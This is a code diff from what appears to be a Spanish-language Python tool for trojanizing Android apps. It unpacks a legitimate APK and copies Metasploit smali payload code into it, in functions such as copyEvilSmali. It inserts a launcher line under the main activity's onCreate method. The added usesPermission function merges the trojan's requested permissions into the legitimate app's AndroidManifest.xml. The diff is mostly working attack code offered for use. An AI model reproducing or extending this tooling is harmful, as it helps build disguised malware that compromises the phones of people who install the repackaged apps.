@@ -128,7 +128,7 @@ def menu_linux_descomprimir_apk(ruta_apks):
         print(f"\nHa seleccionado descomprimir: {apk_seleccionado}")
 
         apk_path = os.path.join(ruta_apks, apk_seleccionado)
-        
+       
         # Descomprimir el archivo .zip directamente al directorio
         resultUnzipCompressedApk = subprocess.run(["unzip", "-j", apk_path, "-d", ruta_apks])
 
@@ -239,6 +239,7 @@ def copyEvilSmali(ruta_apks, ruta_trojan_apk):
         carpeta_path = os.path.join(ruta_apks, carpeta_seleccionada)
         print(f"\nTroyanizando el proyecto: {carpeta_path}")
 
+        ruta_directorio_troyano = os.path.join(ruta_apks, "trojan")
         ruta_smali_apk_legitima = os.path.join(carpeta_path, "smali", "smali", "com", "metasploit")
         copy_malicious_smali_to_apk_legit_route = os.path.join(carpeta_path, "smali")
 
@@ -247,12 +248,12 @@ def copyEvilSmali(ruta_apks, ruta_trojan_apk):
             os.chdir(ruta_trojan_apk)
             os.system(f"tar -cf - ./smali | (cd {copy_malicious_smali_to_apk_legit_route}; tar -xpf -)")
             
-            apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route)
+            apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route, ruta_directorio_troyano)
 
     except ValueError:
         print("\nEntrada inválida. Por favor ingrese un número.")
 
-def apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route):
+def apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route, ruta_directorio_troyano):
     print(f"{carpeta_path}")
     os.chdir(carpeta_path)
     
@@ -305,6 +306,8 @@ def apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route):
                         file.seek(0)
                         file.writelines(lineas)
                         print("\nLínea añadida correctamente debajo del método onCreate.")
+                        usesPermission(ruta_directorio_troyano, carpeta_path)
+
                     else:
                         print(f"\nNo se encontró el método '{metodo_oncreate}' en el archivo.")
 
@@ -313,6 +316,30 @@ def apkMain(carpeta_path, copy_malicious_smali_to_apk_legit_route):
 
         else:
             print(f"\nNo se encontró el archivo smali para la actividad principal '{actividad_principal}'")
+
+def usesPermission(ruta_directorio_troyano, carpeta_path):
+    ruta_trojan_AndroidManifest = os.path.join(ruta_directorio_troyano, "AndroidManifest.xml")
+    ruta_apk_legit_AndroidManifest = os.path.join(carpeta_path, "AndroidManifest.xml")
+
+    print(f"\n{ruta_apk_legit_AndroidManifest}\n")
+
+    resultTrojanPermissions = subprocess.run(["cat", ruta_trojan_AndroidManifest], stdout=subprocess.PIPE, text=True)
+    grep_result = subprocess.run(["grep", "uses-permission"], input=resultTrojanPermissions.stdout, stdout=subprocess.PIPE, text=True)
+
+    #print(grep_result)
+
+    permissionsArray = [line.lstrip() for line in grep_result.stdout.strip().split('\n')]
+    print(permissionsArray)
+    print(f"\n")
+
+    with open(ruta_apk_legit_AndroidManifest, "r") as manifest_file:
+        lines = manifest_file.readlines()
+        last_permission_line_index = max((i for i, line in enumerate(lines) if '<uses-permission' in line), default=-1)
+        lines.insert(last_permission_line_index + 1, '\n'.join(permissionsArray) + '\n')
+
+    with open(ruta_apk_legit_AndroidManifest, 'w') as manifest_file:
+        manifest_file.writelines(lines)
+        print(last_permission_line_index)
 
 def verificar_programa_windows(programa):
     result_verificar_programas_windowsx = subprocess.run(["where", programa])
